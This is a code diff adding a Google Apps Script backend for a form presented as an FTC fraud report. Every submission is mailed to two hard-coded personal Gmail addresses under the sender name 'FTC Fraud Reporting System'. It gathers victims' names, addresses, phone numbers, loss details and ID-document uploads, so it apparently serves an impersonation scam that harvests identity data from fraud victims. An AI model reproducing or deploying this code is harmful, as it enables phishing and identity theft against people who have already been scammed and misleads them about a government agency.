@@ -1,0 +1,298 @@
+// FTC Fraud Report Form - Google Apps Script
+// This script handles form submissions and sends email notifications
+
+// CONFIGURATION - EMAIL ADDRESSES
+const PRIMARY_EMAIL = 'janetgunnoe09@gmail.com';  // Primary email
+const SECONDARY_EMAIL = 'pw065508@gmail.com';  // Secondary email
+
+// Optional: Google Sheet for storing submissions (create a sheet and paste its ID here)
+const SHEET_ID = '';  // e.g., '1BxiMVs0XRA5nFMdKbBdB_1234567890abcdef'
+
+function doPost(e) {
+  try {
+    const data = JSON.parse(e.postData.contents);
+    
+    // Log the submission
+    console.log('New fraud report received:', data.reportNumber);
+    
+    // Save to Google Sheet if configured
+    if (SHEET_ID) {
+      saveToSheet(data);
+    }
+    
+    // Send email notifications
+    sendEmailNotifications(data);
+    
+    return ContentService.createTextOutput(JSON.stringify({
+      status: 'success',
+      message: 'Report submitted successfully'
+    })).setMimeType(ContentService.MimeType.JSON);
+    
+  } catch (error) {
+    console.error('Error processing submission:', error);
+    return ContentService.createTextOutput(JSON.stringify({
+      status: 'error',
+      message: 'Error processing submission'
+    })).setMimeType(ContentService.MimeType.JSON);
+  }
+}
+
+function sendEmailNotifications(data) {
+  const subject = `New FTC Fraud Report - ${data.reportNumber}`;
+  
+  // Create email body with all form data
+  const emailBody = createEmailBody(data);
+  
+  // Send to primary email
+  MailApp.sendEmail({
+    to: PRIMARY_EMAIL,
+    subject: subject,
+    htmlBody: emailBody,
+    name: 'FTC Fraud Reporting System'
+  });
+  
+  // Send to secondary email
+  MailApp.sendEmail({
+    to: SECONDARY_EMAIL,
+    subject: subject,
+    htmlBody: emailBody,
+    name: 'FTC Fraud Reporting System'
+  });
+  
+  console.log('Emails sent to both addresses');
+}
+
+function createEmailBody(data) {
+  let body = `
+    <html>
+    <head>
+      <style>
+        body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; }
+        .container { max-width: 600px; margin: 0 auto; padding: 20px; }
+        .header { background: #003366; color: white; padding: 20px; text-align: center; }
+        .header h1 { margin: 0; font-size: 24px; }
+        .content { background: #f5f7fa; padding: 20px; border-radius: 8px; margin-top: 20px; }
+        .section { margin-bottom: 20px; }
+        .section h3 { color: #003366; border-bottom: 2px solid #003366; padding-bottom: 10px; margin-bottom: 15px; }
+        .field { margin-bottom: 10px; }
+        .label { font-weight: bold; color: #003366; }
+        .value { color: #333; }
+        .highlight { background: #e3f2fd; padding: 15px; border-radius: 6px; margin: 20px 0; }
+        .footer { text-align: center; margin-top: 30px; color: #666; font-size: 12px; }
+        table { width: 100%; border-collapse: collapse; margin: 10px 0; }
+        th, td { padding: 10px; text-align: left; border-bottom: 1px solid #ddd; }
+        th { background: #003366; color: white; }
+      </style>
+    </head>
+    <body>
+      <div class="container">
+        <div class="header">
+          <h1>🛡️ New Fraud Report Submitted</h1>
+        </div>
+        
+        <div class="highlight">
+          <strong>Report Number:</strong> ${data.reportNumber || 'N/A'}<br>
+          <strong>Submitted:</strong> ${new Date().toLocaleString()}
+        </div>
+        
+        <div class="content">
+          <div class="section">
+            <h3>📋 Report Details</h3>
+            <div class="field">
+              <span class="label">Category:</span>
+              <span class="value">${data.category || 'N/A'}</span>
+            </div>
+            <div class="field">
+              <span class="label">Date of Incident:</span>
+              <span class="value">${data.date || 'N/A'}</span>
+            </div>
+            <div class="field">
+              <span class="label">Money Lost:</span>
+              <span class="value">${data.moneyLost === 'yes' ? '$' + (data.amountLost || '0') : data.moneyLost || 'N/A'}</span>
+            </div>
+            <div class="field">
+              <span class="label">Payment Method:</span>
+              <span class="value">${data.paymentMethod || 'N/A'}</span>
+            </div>
+          </div>
+          
+          <div class="section">
+            <h3>📝 Story</h3>
+            <p>${data.story || 'No story provided'}</p>
+          </div>
+          
+          <div class="section">
+            <h3>👤 Scammer Information</h3>
+            <div class="field">
+              <span class="label">Name:</span>
+              <span class="value">${data.scammerName || 'N/A'}</span>
+            </div>
+            <div class="field">
+              <span class="label">Phone:</span>
+              <span class="value">${data.scammerPhone || 'N/A'}</span>
+            </div>
+            <div class="field">
+              <span class="label">Email:</span>
+              <span class="value">${data.scammerEmail || 'N/A'}</span>
+            </div>
+            <div class="field">
+              <span class="label">Website:</span>
+              <span class="value">${data.scammerWebsite || 'N/A'}</span>
+            </div>
+            <div class="field">
+              <span class="label">Contact Method:</span>
+              <span class="value">${data.contactMethod || 'N/A'}</span>
+            </div>
+            <div class="field">
+              <span class="label">Pretending to be:</span>
+              <span class="value">${data.pretending || 'N/A'}</span>
+            </div>
+          </div>
+          
+          <div class="section">
+            <h3>👤 Reporter Information</h3>
+            <div class="field">
+              <span class="label">Name:</span>
+              <span class="value">${data.firstName} ${data.lastName}</span>
+            </div>
+            <div class="field">
+              <span class="label">Email:</span>
+              <span class="value">${data.email || 'N/A'}</span>
+            </div>
+            <div class="field">
+              <span class="label">Phone:</span>
+              <span class="value">${data.phone || 'N/A'}</span>
+            </div>
+            <div class="field">
+              <span class="label">Address:</span>
+              <span class="value">${data.address || ''}, ${data.city || ''}, ${data.state || ''} ${data.zip || ''}</span>
+            </div>
+          </div>
+          
+          ${data.idFrontUploaded || data.idBackUploaded ? `
+          <div class="section">
+            <h3>🪪 ID Uploads</h3>
+            <div class="field">
+              <span class="label">Front ID:</span>
+              <span class="value">${data.idFrontUploaded || 'Not uploaded'}</span>
+            </div>
+            <div class="field">
+              <span class="label">Back ID:</span>
+              <span class="value">${data.idBackUploaded || 'Not uploaded'}</span>
+            </div>
+          </div>
+          ` : ''}
+        </div>
+        
+        <div class="footer">
+          <p>This is an automated email from the FTC Fraud Reporting System</p>
+          <p>Report Number: ${data.reportNumber}</p>
+        </div>
+      </div>
+    </body>
+    </html>
+  `;
+  
+  return body;
+}
+
+function saveToSheet(data) {
+  try {
+    const ss = SpreadsheetApp.openById(SHEET_ID);
+    let sheet = ss.getSheetByName('Submissions');
+    
+    if (!sheet) {
+      sheet = ss.insertSheet('Submissions');
+      // Add headers
+      sheet.appendRow([
+        'Report Number',
+        'Timestamp',
+        'Category',
+        'Date',
+        'Money Lost',
+        'Amount',
+        'Payment Method',
+        'Story',
+        'Scammer Name',
+        'Scammer Phone',
+        'Scammer Email',
+        'Scammer Website',
+        'Contact Method',
+        'Pretending',
+        'First Name',
+        'Last Name',
+        'Email',
+        'Phone',
+        'Address',
+        'City',
+        'State',
+        'ZIP',
+        'ID Front',
+        'ID Back'
+      ]);
+    }
+    
+    // Add new row
+    sheet.appendRow([
+      data.reportNumber,
+      new Date(),
+      data.category,
+      data.date,
+      data.moneyLost,
+      data.amountLost,
+      data.paymentMethod,
+      data.story,
+      data.scammerName,
+      data.scammerPhone,
+      data.scammerEmail,
+      data.scammerWebsite,
+      data.contactMethod,
+      data.pretending,
+      data.firstName,
+      data.lastName,
+      data.email,
+      data.phone,
+      data.address,
+      data.city,
+      data.state,
+      data.zip,
+      data.idFrontUploaded,
+      data.idBackUploaded
+    ]);
+    
+    console.log('Data saved to sheet');
+  } catch (error) {
+    console.error('Error saving to sheet:', error);
+  }
+}
+
+// Test function - run this manually to test email sending
+function testEmail() {
+  const testData = {
+    reportNumber: 'FTC-2024-TEST001',
+    category: 'impersonator',
+    date: '2024-06-26',
+    moneyLost: 'yes',
+    amountLost: '5000',
+    paymentMethod: 'bank-transfer',
+    story: 'This is a test submission to verify email notifications are working correctly.',
+    scammerName: 'John Doe',
+    scammerPhone: '1234567890',
+    scammerEmail: 'scammer@example.com',
+    scammerWebsite: 'https://fake-site.com',
+    contactMethod: 'phone-call',
+    pretending: 'irs',
+    firstName: 'Jane',
+    lastName: 'Smith',
+    email: 'jane@example.com',
+    phone: '0987654321',
+    address: '123 Main St',
+    city: 'Washington',
+    state: 'DC',
+    zip: '20001',
+    idFrontUploaded: 'front.jpg',
+    idBackUploaded: 'back.jpg'
+  };
+  
+  sendEmailNotifications(testData);
+}
